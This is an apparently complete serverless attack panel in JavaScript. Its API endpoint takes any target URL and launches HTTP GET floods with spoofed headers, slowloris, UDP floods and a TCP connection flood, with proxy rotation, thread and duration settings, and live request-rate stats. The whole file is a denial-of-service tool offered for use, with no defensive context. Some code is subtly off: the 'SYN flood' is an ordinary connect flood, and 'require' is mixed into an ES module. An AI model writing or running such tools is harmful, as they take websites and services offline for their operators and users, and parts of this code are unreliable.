import https from 'https';
import http from 'http';
import net from 'net';
import tls from 'tls';
import { URL } from 'url';

let STATE = { running:false, req:0, err:0, rps:0, threads:0, logs:[], lastReq:0, startTs:0 };
let workers = [];

const PROXIES = [
  // isi proxy pool kamu di sini, format: host:port
  // "127.0.0.1:8080",
];

function pickProxy(){ return PROXIES.length ? PROXIES[Math.floor(Math.random()*PROXIES.length)] : null; }

function log(msg, cls='info'){ STATE.logs.push({msg,cls}); if(STATE.logs.length>200) STATE.logs.shift(); }

/* ---------- HTTP FLOOD ---------- */
function httpFlood(target, duration){
  const u = new URL(target);
  const agent = new https.Agent({ rejectUnauthorized:false, keepAlive:true, maxSockets:512 });
  const paths = ['/','/?r='+Math.random(),'/api','/login','/search?q='+Math.random().toString(36)];
  const end = Date.now()+duration*1000;

  const fire = () => {
    if(!STATE.running || Date.now()>end) return;
    const path = paths[Math.floor(Math.random()*paths.length)];
    const mod = u.protocol==='https:' ? https : http;
    const req = mod.request({
      hostname:u.hostname, port:u.port||(u.protocol==='https:'?443:80),
      path, method:'GET',
      headers:{
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Accept':'*/*','Connection':'keep-alive',
        'Cache-Control':'no-cache','X-Forwarded-For':Array.from({length:4},()=>Math.floor(Math.random()*255)).join('.')
      },
      agent: u.protocol==='https:' ? agent : undefined,
      timeout: 8000
    }, res => {
      STATE.req++;
      res.on('data',()=>{});
      res.on('end',()=>{});
    });
    req.on('error',()=>{ STATE.err++; });
    req.on('timeout',()=>{ req.destroy(); STATE.err++; });
    req.end();
    setImmediate(fire);
  };

  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- SLOWLORIS ---------- */
function slowloris(target, duration){
  const u = new URL(target);
  const port = u.port || (u.protocol==='https:'?443:80);
  const end = Date.now()+duration*1000;
  const sockets = [];

  const open = () => {
    if(!STATE.running || Date.now()>end) return;
    const sock = net.connect(port, u.hostname, () => {
      sock.write(`GET ${u.pathname||'/'} HTTP/1.1\r\nHost: ${u.hostname}\r\n`);
      sock.write('User-Agent: Mozilla/5.0\r\n');
      const iv = setInterval(() => {
        if(!STATE.running || Date.now()>end){ clearInterval(iv); sock.destroy(); return; }
        sock.write(`X-a: ${Math.random()}\r\n`);
        STATE.req++;
      }, 8000);
    });
    sock.on('error',()=>STATE.err++);
    sockets.push(sock);
    setTimeout(open, 300);
  };
  for(let i=0;i<STATE.threads;i++) open();
}

/* ---------- UDP FLOOD ---------- */
function udpFlood(target, duration){
  const u = new URL(target);
  const port = u.port || 80;
  const end = Date.now()+duration*1000;
  const payload = Buffer.alloc(1400, 0x41);

  const fire = () => {
    if(!STATE.running || Date.now()>end) return;
    const s = require('dgram').createSocket('udp4');
    s.send(payload, 0, payload.length, port, u.hostname, ()=>{
      STATE.req++; s.close();
    });
    s.on('error',()=>{ STATE.err++; s.close(); });
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- SYN FLOOD (raw socket, butuh root) ---------- */
function synFlood(target, duration){
  const u = new URL(target);
  const port = u.port || 80;
  const end = Date.now()+duration*1000;
  const raw = require('net').Socket;

  const fire = () => {
    if(!STATE.running || Date.now()>end) return;
    const s = new raw();
    s.setTimeout(2000, ()=>s.destroy());
    s.connect(port, u.hostname, ()=>{ STATE.req++; s.destroy(); });
    s.on('error',()=>{ STATE.err++; s.destroy(); });
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- HANDLER ---------- */
export default async function handler(req, res){
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Access-Control-Allow-Methods','GET,POST,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers','Content-Type');
  if(req.method==='OPTIONS') return res.status(200).end();

  if(req.method==='POST'){
    const { target, method='http', threads=128, duration=30 } = req.body||{};
    if(!target) return res.status(400).json({error:'target required'});

    STATE = { running:true, req:0, err:0, rps:0, threads, logs:[], lastReq:0, startTs:Date.now() };
    workers = [];
    log(`spawn ${method} → ${target} | t=${threads} d=${duration}s`,'ok');

    const runner = { http:httpFlood, slowloris:slowloris, udp:udpFlood, syn:synFlood }[method] || httpFlood;
    runner(target, duration);

    const monitor = setInterval(() => {
      const now = Date.now();
      STATE.rps = Math.round((STATE.req - STATE.lastReq) / ((now - STATE.startTs)/1000 || 1));
      STATE.lastReq = STATE.req;
      if(!STATE.running || now-STATE.startTs > duration*1000){
        clearInterval(monitor);
        STATE.running = false;
        log('attack selesai.','ok');
      }
    }, 1000);

    return res.json({ workers: threads, proxies: PROXIES.length, started: true });
  }

  if(req.method==='DELETE'){
    STATE.running = false;
    workers.forEach(w=>{ try{w.destroy()}catch(e){} });
    log('dihentikan manual.','warn');
    return res.json({ stopped:true });
  }

  if(req.method==='GET'){
    return res.json({
      req: STATE.req, err: STATE.err, rps: STATE.rps,
      threads: STATE.threads, logs: STATE.logs.splice(0, STATE.logs.length)
    });
  }

  res.status(405).json({error:'method not allowed'});
}
